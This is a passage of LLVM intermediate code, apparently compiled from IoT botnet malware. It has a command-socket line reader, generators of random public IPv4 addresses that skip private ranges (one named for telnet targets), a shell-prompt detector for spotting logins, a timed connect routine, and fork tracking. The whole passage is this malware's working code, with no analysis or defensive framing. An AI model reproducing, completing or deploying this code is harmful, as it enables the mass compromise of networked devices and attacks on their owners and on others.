declare void @free(i8* nocapture) local_unnamed_addr #5

; Function Attrs: noinline nounwind readonly uwtable
define i32 @wildString(i8* readonly, i8* readonly) local_unnamed_addr #8 {
  %3 = load i8, i8* %0, align 1
  switch i8 %3, label %32 [
    i8 0, label %4
    i8 42, label %7
    i8 63, label %21
  ]

; <label>:4:                                      ; preds = %2
  %5 = load i8, i8* %1, align 1
  %6 = zext i8 %5 to i32
  br label %47

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds i8, i8* %0, i64 1
  %9 = tail call i32 @wildString(i8* %8, i8* %1)
  %10 = icmp eq i32 %9, 0
  br i1 %10, label %18, label %11

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* %1, align 1
  %13 = icmp eq i8 %12, 0
  br i1 %13, label %18, label %14

; <label>:14:                                     ; preds = %11
  %15 = getelementptr inbounds i8, i8* %1, i64 1
  %16 = tail call i32 @wildString(i8* nonnull %0, i8* %15)
  %17 = icmp ne i32 %16, 0
  br label %18

; <label>:18:                                     ; preds = %11, %7, %14
  %19 = phi i1 [ false, %7 ], [ true, %11 ], [ %17, %14 ]
  %20 = zext i1 %19 to i32
  br label %47

; <label>:21:                                     ; preds = %2
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %29, label %24

; <label>:24:                                     ; preds = %21
  %25 = getelementptr inbounds i8, i8* %0, i64 1
  %26 = getelementptr inbounds i8, i8* %1, i64 1
  %27 = tail call i32 @wildString(i8* %25, i8* %26)
  %28 = icmp ne i32 %27, 0
  br label %29

; <label>:29:                                     ; preds = %21, %24
  %30 = phi i1 [ true, %21 ], [ %28, %24 ]
  %31 = zext i1 %30 to i32
  br label %47

; <label>:32:                                     ; preds = %2
  %33 = zext i8 %3 to i32
  %34 = tail call i32 @toupper(i32 %33) #14
  %35 = load i8, i8* %1, align 1
  %36 = zext i8 %35 to i32
  %37 = tail call i32 @toupper(i32 %36) #14
  %38 = icmp eq i32 %34, %37
  br i1 %38, label %39, label %44

; <label>:39:                                     ; preds = %32
  %40 = getelementptr inbounds i8, i8* %0, i64 1
  %41 = getelementptr inbounds i8, i8* %1, i64 1
  %42 = tail call i32 @wildString(i8* %40, i8* %41)
  %43 = icmp ne i32 %42, 0
  br label %44

; <label>:44:                                     ; preds = %39, %32
  %45 = phi i1 [ true, %32 ], [ %43, %39 ]
  %46 = zext i1 %45 to i32
  br label %47

; <label>:47:                                     ; preds = %44, %29, %18, %4
  %.0 = phi i32 [ %46, %44 ], [ %31, %29 ], [ %20, %18 ], [ %6, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr* nocapture) local_unnamed_addr #2 {
  %3 = tail call i32 @inet_addr(i8* %0) #7
  %4 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1, i64 0, i32 0
  store i32 %3, i32* %4, align 4
  %5 = icmp eq i32 %3, -1
  %. = zext i1 %5 to i32
  ret i32 %.
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #5

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeRandomStr(i8* nocapture, i32) local_unnamed_addr #1 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %4 = tail call i32 @rand_cmwc()
  %5 = urem i32 %4, 26
  %6 = add nuw nsw i32 %5, 65
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  store i8 %7, i8* %8, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8* nocapture, i32) local_unnamed_addr #2 {
  %4 = alloca %struct.fd_set, align 8
  %5 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %5 to %struct.timeval*
  %6 = alloca i8, align 1
  %7 = sext i32 %2 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %1, i8 0, i64 %7, i32 1, i1 false)
  store <2 x i64> <i64 30, i64 0>, <2 x i64>* %5, align 16
  %8 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %4, i64 0, i32 0, i64 0
  %9 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %8) #7, !srcloc !14
  %10 = srem i32 %0, 64
  %11 = zext i32 %10 to i64
  %12 = shl i64 1, %11
  %13 = sdiv i32 %0, 64
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %4, i64 0, i32 0, i64 %14
  %16 = load i64, i64* %15, align 8
  %17 = or i64 %16, %12
  store i64 %17, i64* %15, align 8
  %18 = add nsw i32 %0, 1
  %19 = call i32 @select(i32 %18, %struct.fd_set* nonnull %4, %struct.fd_set* null, %struct.fd_set* nonnull %4, %struct.timeval* nonnull %tmpcast) #7
  %20 = icmp sgt i32 %2, 1
  br i1 %20, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %29
  %.in = phi i32 [ %21, %29 ], [ %2, %.lr.ph.preheader ]
  %.024 = phi i32 [ %30, %29 ], [ 0, %.lr.ph.preheader ]
  %.01923 = phi i8* [ %27, %29 ], [ %1, %.lr.ph.preheader ]
  %21 = add nsw i32 %.in, -1
  %22 = load i32, i32* @mainCommSock, align 4
  %23 = call i64 @recv(i32 %22, i8* nonnull %6, i64 1, i32 0) #7
  %24 = icmp eq i64 %23, 1
  br i1 %24, label %25, label %._crit_edge.loopexit

; <label>:25:                                     ; preds = %.lr.ph
  %26 = load i8, i8* %6, align 1
  %27 = getelementptr inbounds i8, i8* %.01923, i64 1
  store i8 %26, i8* %.01923, align 1
  %28 = icmp eq i8 %26, 10
  br i1 %28, label %._crit_edge.loopexit, label %29

; <label>:29:                                     ; preds = %25
  %30 = add nuw nsw i32 %.024, 1
  %31 = icmp sgt i32 %21, 1
  br i1 %31, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %29, %25
  %.1.sink.ph = phi i8* [ %.01923, %.lr.ph ], [ %27, %29 ], [ %27, %25 ]
  %.020.ph = phi i32 [ -1, %.lr.ph ], [ %30, %29 ], [ %.024, %25 ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.1.sink = phi i8* [ %1, %3 ], [ %.1.sink.ph, %._crit_edge.loopexit ]
  %.020 = phi i32 [ 0, %3 ], [ %.020.ph, %._crit_edge.loopexit ]
  store i8 0, i8* %.1.sink, align 1
  ret i32 %.020
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) local_unnamed_addr #2 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.fd_set, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #7
  %11 = sext i32 %10 to i64
  %12 = or i64 %11, 2048
  %13 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %12) #7
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %14, align 4
  %15 = trunc i32 %2 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #15
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %19 = call i32 @getHost(i8* %1, %struct.in_addr* %18)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %58

; <label>:21:                                     ; preds = %4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %23 = bitcast i8* %22 to i64*
  store i64 0, i64* %23, align 4
  %24 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %0, %struct.sockaddr* nonnull %24, i32 16) #7
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %53

; <label>:27:                                     ; preds = %21
  %28 = tail call i32* @__errno_location() #15
  %29 = load i32, i32* %28, align 4
  %30 = icmp eq i32 %29, 115
  br i1 %30, label %31, label %58

; <label>:31:                                     ; preds = %27
  %32 = sext i32 %3 to i64
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 0
  store i64 %32, i64* %33, align 8
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 1
  store i64 0, i64* %34, align 8
  %35 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i64 0, i32 0, i64 0
  %36 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %35) #7, !srcloc !15
  %37 = srem i32 %0, 64
  %38 = zext i32 %37 to i64
  %39 = shl i64 1, %38
  %40 = sdiv i32 %0, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i64 0, i32 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %39
  store i64 %44, i64* %42, align 8
  %45 = add nsw i32 %0, 1
  %46 = call i32 @select(i32 %45, %struct.fd_set* null, %struct.fd_set* nonnull %6, %struct.fd_set* null, %struct.timeval* nonnull %7) #7
  %47 = icmp sgt i32 %46, 0
  br i1 %47, label %48, label %58

; <label>:48:                                     ; preds = %31
  store i32 4, i32* %8, align 4
  %49 = bitcast i32* %9 to i8*
  %50 = call i32 @getsockopt(i32 %0, i32 1, i32 4, i8* nonnull %49, i32* nonnull %8) #7
  %51 = load i32, i32* %9, align 4
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %58

; <label>:53:                                     ; preds = %48, %21
  %54 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #7
  %55 = sext i32 %54 to i64
  %56 = and i64 %55, -2049
  %57 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %56) #7
  br label %58

; <label>:58:                                     ; preds = %27, %31, %48, %4, %53
  %.0 = phi i32 [ 1, %53 ], [ 0, %4 ], [ 0, %48 ], [ 0, %31 ], [ 0, %27 ]
  ret i32 %.0
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #9

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #9

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() local_unnamed_addr #2 {
  %1 = tail call i32 @fork() #7
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %21, label %3

; <label>:3:                                      ; preds = %0
  %4 = load i64, i64* @numpids, align 8
  %5 = add i64 %4, 1
  store i64 %5, i64* @numpids, align 8
  %6 = shl i64 %4, 2
  %7 = add i64 %6, 8
  %8 = tail call noalias i8* @malloc(i64 %7) #7
  %9 = bitcast i8* %8 to i32*
  %10 = icmp eq i64 %4, 0
  br i1 %10, label %.._crit_edge_crit_edge, label %.lr.ph.preheader

.._crit_edge_crit_edge:                           ; preds = %3
  %.pre14 = load i8*, i8** bitcast (i32** @pids to i8**), align 8
  br label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  %.pre = load i32*, i32** @pids, align 8
  %11 = bitcast i32* %.pre to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %12 = phi i64 [ %17, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i32 [ %16, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %13 = getelementptr inbounds i32, i32* %.pre, i64 %12
  %14 = load i32, i32* %13, align 4
  %15 = getelementptr inbounds i32, i32* %9, i64 %12
  store i32 %14, i32* %15, align 4
  %16 = add i32 %.012, 1
  %17 = zext i32 %16 to i64
  %18 = icmp ult i64 %17, %4
  br i1 %18, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.._crit_edge_crit_edge
  %19 = phi i8* [ %.pre14, %.._crit_edge_crit_edge ], [ %11, %._crit_edge.loopexit ]
  %.lcssa = phi i64 [ 0, %.._crit_edge_crit_edge ], [ %4, %._crit_edge.loopexit ]
  %20 = getelementptr inbounds i32, i32* %9, i64 %.lcssa
  store i32 %1, i32* %20, align 4
  tail call void @free(i8* %19) #7
  store i8* %8, i8** bitcast (i32** @pids to i8**), align 8
  br label %21

; <label>:21:                                     ; preds = %0, %._crit_edge
  ret i32 %1
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #5

; Function Attrs: noinline nounwind readonly uwtable
define i32 @matchPrompt(i8* nocapture readonly) local_unnamed_addr #8 {
.preheader:
  %1 = tail call i64 @strlen(i8* %0) #14
  %2 = trunc i64 %1 to i32
  %sext = shl i64 %1, 32
  %3 = ashr exact i64 %sext, 32
  %4 = getelementptr inbounds i8, i8* %0, i64 %3
  %sext41 = shl i64 %1, 32
  %5 = ashr exact i64 %sext41, 32
  %6 = icmp sgt i32 %2, 0
  br i1 %6, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.preheader.137:                                   ; preds = %.critedge
  %7 = icmp sgt i32 %2, %.1.lcssa
  br i1 %7, label %.lr.ph.1.preheader, label %.critedge.1

.lr.ph.1.preheader:                               ; preds = %.preheader.137
  br label %.lr.ph.1

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.critedge1
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %.130 = phi i32 [ %12, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %8 = sub nsw i64 0, %indvars.iv
  %9 = getelementptr inbounds i8, i8* %4, i64 %8
  %10 = load i8, i8* %9, align 1
  %11 = trunc i64 %indvars.iv to i32
  switch i8 %10, label %.critedge.loopexit [
    i8 0, label %.critedge1
    i8 32, label %.critedge1
    i8 13, label %.critedge1
    i8 10, label %.critedge1
  ]

.critedge1:                                       ; preds = %.lr.ph, %.lr.ph, %.lr.ph, %.lr.ph
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %12 = add nsw i32 %.130, 1
  %13 = icmp sgt i64 %5, %indvars.iv.next
  br i1 %13, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %.critedge1
  %.1.lcssa.ph = phi i32 [ %11, %.lr.ph ], [ %12, %.critedge1 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.1.lcssa = phi i32 [ 0, %.preheader ], [ %.1.lcssa.ph, %.critedge.loopexit ]
  %14 = sext i32 %.1.lcssa to i64
  %15 = sub nsw i64 0, %14
  %16 = getelementptr inbounds i8, i8* %4, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = icmp eq i8 %17, 58
  br i1 %18, label %19, label %.preheader.137

; <label>:19:                                     ; preds = %.critedge.3, %.critedge.2, %.critedge.1, %.critedge
  ret i32 1

.lr.ph.1:                                         ; preds = %.lr.ph.1.preheader, %.critedge1.1
  %indvars.iv.1 = phi i64 [ %indvars.iv.next.1, %.critedge1.1 ], [ %14, %.lr.ph.1.preheader ]
  %.130.1 = phi i32 [ %24, %.critedge1.1 ], [ %.1.lcssa, %.lr.ph.1.preheader ]
  %20 = sub nsw i64 0, %indvars.iv.1
  %21 = getelementptr inbounds i8, i8* %4, i64 %20
  %22 = load i8, i8* %21, align 1
  %23 = trunc i64 %indvars.iv.1 to i32
  switch i8 %22, label %.critedge.1.loopexit [
    i8 0, label %.critedge1.1
    i8 32, label %.critedge1.1
    i8 13, label %.critedge1.1
    i8 10, label %.critedge1.1
  ]

.critedge1.1:                                     ; preds = %.lr.ph.1, %.lr.ph.1, %.lr.ph.1, %.lr.ph.1
  %indvars.iv.next.1 = add nsw i64 %indvars.iv.1, 1
  %24 = add nsw i32 %.130.1, 1
  %25 = icmp sgt i64 %5, %indvars.iv.next.1
  br i1 %25, label %.lr.ph.1, label %.critedge.1.loopexit

.critedge.1.loopexit:                             ; preds = %.critedge1.1, %.lr.ph.1
  %.1.lcssa.1.ph = phi i32 [ %23, %.lr.ph.1 ], [ %24, %.critedge1.1 ]
  br label %.critedge.1

.critedge.1:                                      ; preds = %.critedge.1.loopexit, %.preheader.137
  %.1.lcssa.1 = phi i32 [ %.1.lcssa, %.preheader.137 ], [ %.1.lcssa.1.ph, %.critedge.1.loopexit ]
  %26 = sext i32 %.1.lcssa.1 to i64
  %27 = sub nsw i64 0, %26
  %28 = getelementptr inbounds i8, i8* %4, i64 %27
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 62
  br i1 %30, label %19, label %.preheader.238

.preheader.238:                                   ; preds = %.critedge.1
  %31 = icmp sgt i32 %2, %.1.lcssa.1
  br i1 %31, label %.lr.ph.2.preheader, label %.critedge.2

.lr.ph.2.preheader:                               ; preds = %.preheader.238
  br label %.lr.ph.2

.lr.ph.2:                                         ; preds = %.lr.ph.2.preheader, %.critedge1.2
  %indvars.iv.2 = phi i64 [ %indvars.iv.next.2, %.critedge1.2 ], [ %26, %.lr.ph.2.preheader ]
  %.130.2 = phi i32 [ %36, %.critedge1.2 ], [ %.1.lcssa.1, %.lr.ph.2.preheader ]
  %32 = sub nsw i64 0, %indvars.iv.2
  %33 = getelementptr inbounds i8, i8* %4, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = trunc i64 %indvars.iv.2 to i32
  switch i8 %34, label %.critedge.2.loopexit [
    i8 0, label %.critedge1.2
    i8 32, label %.critedge1.2
    i8 13, label %.critedge1.2
    i8 10, label %.critedge1.2
  ]

.critedge1.2:                                     ; preds = %.lr.ph.2, %.lr.ph.2, %.lr.ph.2, %.lr.ph.2
  %indvars.iv.next.2 = add nsw i64 %indvars.iv.2, 1
  %36 = add nsw i32 %.130.2, 1
  %37 = icmp sgt i64 %5, %indvars.iv.next.2
  br i1 %37, label %.lr.ph.2, label %.critedge.2.loopexit

.critedge.2.loopexit:                             ; preds = %.critedge1.2, %.lr.ph.2
  %.1.lcssa.2.ph = phi i32 [ %35, %.lr.ph.2 ], [ %36, %.critedge1.2 ]
  br label %.critedge.2

.critedge.2:                                      ; preds = %.critedge.2.loopexit, %.preheader.238
  %.1.lcssa.2 = phi i32 [ %.1.lcssa.1, %.preheader.238 ], [ %.1.lcssa.2.ph, %.critedge.2.loopexit ]
  %38 = sext i32 %.1.lcssa.2 to i64
  %39 = sub nsw i64 0, %38
  %40 = getelementptr inbounds i8, i8* %4, i64 %39
  %41 = load i8, i8* %40, align 1
  %42 = icmp eq i8 %41, 37
  br i1 %42, label %19, label %.preheader.339

.preheader.339:                                   ; preds = %.critedge.2
  %43 = icmp sgt i32 %2, %.1.lcssa.2
  br i1 %43, label %.lr.ph.3.preheader, label %.critedge.3

.lr.ph.3.preheader:                               ; preds = %.preheader.339
  br label %.lr.ph.3

.lr.ph.3:                                         ; preds = %.lr.ph.3.preheader, %.critedge1.3
  %indvars.iv.3 = phi i64 [ %indvars.iv.next.3, %.critedge1.3 ], [ %38, %.lr.ph.3.preheader ]
  %.130.3 = phi i32 [ %48, %.critedge1.3 ], [ %.1.lcssa.2, %.lr.ph.3.preheader ]
  %44 = sub nsw i64 0, %indvars.iv.3
  %45 = getelementptr inbounds i8, i8* %4, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = trunc i64 %indvars.iv.3 to i32
  switch i8 %46, label %.critedge.3.loopexit [
    i8 0, label %.critedge1.3
    i8 32, label %.critedge1.3
    i8 13, label %.critedge1.3
    i8 10, label %.critedge1.3
  ]

.critedge1.3:                                     ; preds = %.lr.ph.3, %.lr.ph.3, %.lr.ph.3, %.lr.ph.3
  %indvars.iv.next.3 = add nsw i64 %indvars.iv.3, 1
  %48 = add nsw i32 %.130.3, 1
  %49 = icmp sgt i64 %5, %indvars.iv.next.3
  br i1 %49, label %.lr.ph.3, label %.critedge.3.loopexit

.critedge.3.loopexit:                             ; preds = %.critedge1.3, %.lr.ph.3
  %.1.lcssa.3.ph = phi i32 [ %47, %.lr.ph.3 ], [ %48, %.critedge1.3 ]
  br label %.critedge.3

.critedge.3:                                      ; preds = %.critedge.3.loopexit, %.preheader.339
  %.1.lcssa.3 = phi i32 [ %.1.lcssa.2, %.preheader.339 ], [ %.1.lcssa.3.ph, %.critedge.3.loopexit ]
  %50 = sext i32 %.1.lcssa.3 to i64
  %51 = sub nsw i64 0, %50
  %52 = getelementptr inbounds i8, i8* %4, i64 %51
  %53 = load i8, i8* %52, align 1
  %54 = icmp eq i8 %53, 36
  br i1 %54, label %19, label %.preheader.440

.preheader.440:                                   ; preds = %.critedge.3
  %55 = icmp sgt i32 %2, %.1.lcssa.3
  br i1 %55, label %.lr.ph.4.preheader, label %.critedge.4

.lr.ph.4.preheader:                               ; preds = %.preheader.440
  br label %.lr.ph.4

.lr.ph.4:                                         ; preds = %.lr.ph.4.preheader, %.critedge1.4
  %indvars.iv.4 = phi i64 [ %indvars.iv.next.4, %.critedge1.4 ], [ %50, %.lr.ph.4.preheader ]
  %.130.4 = phi i32 [ %60, %.critedge1.4 ], [ %.1.lcssa.3, %.lr.ph.4.preheader ]
  %56 = sub nsw i64 0, %indvars.iv.4
  %57 = getelementptr inbounds i8, i8* %4, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = trunc i64 %indvars.iv.4 to i32
  switch i8 %58, label %.critedge.4.loopexit [
    i8 0, label %.critedge1.4
    i8 32, label %.critedge1.4
    i8 13, label %.critedge1.4
    i8 10, label %.critedge1.4
  ]

.critedge1.4:                                     ; preds = %.lr.ph.4, %.lr.ph.4, %.lr.ph.4, %.lr.ph.4
  %indvars.iv.next.4 = add nsw i64 %indvars.iv.4, 1
  %60 = add nsw i32 %.130.4, 1
  %61 = icmp sgt i64 %5, %indvars.iv.next.4
  br i1 %61, label %.lr.ph.4, label %.critedge.4.loopexit

.critedge.4.loopexit:                             ; preds = %.critedge1.4, %.lr.ph.4
  %.1.lcssa.4.ph = phi i32 [ %59, %.lr.ph.4 ], [ %60, %.critedge1.4 ]
  br label %.critedge.4

.critedge.4:                                      ; preds = %.critedge.4.loopexit, %.preheader.440
  %.1.lcssa.4 = phi i32 [ %.1.lcssa.3, %.preheader.440 ], [ %.1.lcssa.4.ph, %.critedge.4.loopexit ]
  %62 = sext i32 %.1.lcssa.4 to i64
  %63 = sub nsw i64 0, %62
  %64 = getelementptr inbounds i8, i8* %4, i64 %63
  %65 = load i8, i8* %64, align 1
  %66 = icmp eq i8 %65, 35
  %. = zext i1 %66 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() local_unnamed_addr #2 {
  %1 = alloca [16 x i8], align 16
  br label %.critedge

.critedge:                                        ; preds = %.critedge.backedge, %0
  %2 = tail call i32 @rand() #7
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* @getRandomPublicIP.ipState.0, align 1
  %5 = tail call i32 @rand() #7
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* @getRandomPublicIP.ipState.1, align 1
  %8 = tail call i32 @rand() #7
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* @getRandomPublicIP.ipState.2, align 1
  %11 = tail call i32 @rand() #7
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* @getRandomPublicIP.ipState.3, align 1
  %14 = load i8, i8* @getRandomPublicIP.ipState.0, align 1
  switch i8 %14, label %22 [
    i8 0, label %.critedge.backedge
    i8 10, label %.critedge.backedge
    i8 100, label %15
    i8 127, label %.critedge.backedge
    i8 -87, label %19
  ]

.critedge.backedge:                               ; preds = %.critedge, %.critedge, %.critedge, %19, %15, %22, %27, %32, %43, %46, %40
  br label %.critedge

; <label>:15:                                     ; preds = %.critedge
  %16 = load i8, i8* @getRandomPublicIP.ipState.1, align 1
  %17 = icmp ugt i8 %16, 63
  %18 = icmp sgt i8 %16, -1
  %or.cond = and i1 %17, %18
  br i1 %or.cond, label %.critedge.backedge, label %.thread42

.thread42:                                        ; preds = %15
  %.pre43 = load i8, i8* @getRandomPublicIP.ipState.1, align 1
  br label %.thread45

; <label>:19:                                     ; preds = %.critedge
  %20 = load i8, i8* @getRandomPublicIP.ipState.1, align 1
  %21 = icmp eq i8 %20, -2
  br i1 %21, label %.critedge.backedge, label %.thread45

; <label>:22:                                     ; preds = %.critedge
  %.pre = load i8, i8* @getRandomPublicIP.ipState.1, align 1
  %23 = icmp eq i8 %14, -84
  %24 = icmp ult i8 %.pre, 17
  %or.cond18 = and i1 %23, %24
  br i1 %or.cond18, label %.critedge.backedge, label %27

.thread45:                                        ; preds = %.thread42, %19
  %.ph = phi i8 [ %.pre43, %.thread42 ], [ %20, %19 ]
  %25 = icmp eq i8 %.ph, 0
  %26 = load i8, i8* @getRandomPublicIP.ipState.2, align 1
  br label %32

; <label>:27:                                     ; preds = %22
  %28 = icmp eq i8 %14, -64
  %29 = icmp eq i8 %.pre, 0
  %or.cond20 = and i1 %28, %29
  %30 = load i8, i8* @getRandomPublicIP.ipState.2, align 1
  %31 = icmp eq i8 %30, 2
  %or.cond22 = and i1 %or.cond20, %31
  br i1 %or.cond22, label %.critedge.backedge, label %32

; <label>:32:                                     ; preds = %.thread45, %27
  %33 = phi i8 [ %26, %.thread45 ], [ %30, %27 ]
  %34 = phi i1 [ %25, %.thread45 ], [ %29, %27 ]
  %35 = phi i1 [ false, %.thread45 ], [ %28, %27 ]
  %36 = phi i8 [ %.ph, %.thread45 ], [ %.pre, %27 ]
  %37 = icmp eq i8 %36, 88
  %or.cond24 = and i1 %35, %37
  %38 = icmp eq i8 %33, 99
  %or.cond26 = and i1 %or.cond24, %38
  %39 = icmp eq i8 %36, -88
  %or.cond28 = and i1 %35, %39
  %or.cond39 = or i1 %or.cond28, %or.cond26
  br i1 %or.cond39, label %.critedge.backedge, label %40

; <label>:40:                                     ; preds = %32
  %41 = icmp eq i8 %14, -58
  %42 = and i8 %36, -2
  %switch = icmp eq i8 %42, 18
  %or.cond40 = and i1 %41, %switch
  br i1 %or.cond40, label %.critedge.backedge, label %43

; <label>:43:                                     ; preds = %40
  %44 = icmp eq i8 %36, 51
  %or.cond30 = and i1 %41, %44
  %45 = icmp eq i8 %33, 100
  %or.cond32 = and i1 %or.cond30, %45
  br i1 %or.cond32, label %.critedge.backedge, label %46

; <label>:46:                                     ; preds = %43
  %47 = icmp eq i8 %14, -53
  %or.cond34 = and i1 %47, %34
  %48 = icmp eq i8 %33, 113
  %or.cond36 = and i1 %or.cond34, %48
  %49 = icmp ugt i8 %14, -33
  %or.cond38 = or i1 %49, %or.cond36
  br i1 %or.cond38, label %.critedge.backedge, label %50

; <label>:50:                                     ; preds = %46
  %51 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %51, i8 0, i64 16, i32 16, i1 false)
  %52 = zext i8 %14 to i32
  %53 = zext i8 %36 to i32
  %54 = zext i8 %33 to i32
  %55 = and i32 %12, 255
  %56 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %51, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.114, i64 0, i64 0), i32 %52, i32 %53, i32 %54, i32 %55)
  %57 = call i32 @inet_addr(i8* nonnull %51) #7
  ret i32 %57
}

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @TelnetIPRanges() local_unnamed_addr #2 {
  %1 = alloca [16 x i8], align 16
  br label %.critedge

.critedge:                                        ; preds = %.critedge.backedge, %0
  %2 = tail call i32 @rand() #7
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* @TelnetIPRanges.ipState.0, align 1
  %5 = tail call i32 @rand() #7
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* @TelnetIPRanges.ipState.1, align 1
  %8 = tail call i32 @rand() #7
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* @TelnetIPRanges.ipState.2, align 1
  %11 = tail call i32 @rand() #7
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* @TelnetIPRanges.ipState.3, align 1
